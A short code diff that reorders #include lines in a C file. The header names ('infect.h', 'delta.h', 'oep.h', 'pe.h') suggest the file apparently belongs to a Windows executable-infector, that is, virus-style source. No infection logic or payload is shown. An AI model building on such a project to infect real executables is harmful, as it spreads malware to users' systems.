@@ -1,6 +1,8 @@
 #include <stdint.h>
 #include <windows.h>
 
+#include "code_begin.h"
+#include "code_size.h"
 #include "delta.h"
 #include "function_kernel32.h"
 #include "infect.h"
@@ -8,8 +10,6 @@
 #include "oep.h"
 #include "pe.h"
 #include "utility.h"
-#include "code_begin.h"
-#include "code_size.h"
 
 typedef struct {
     HANDLE h_file;
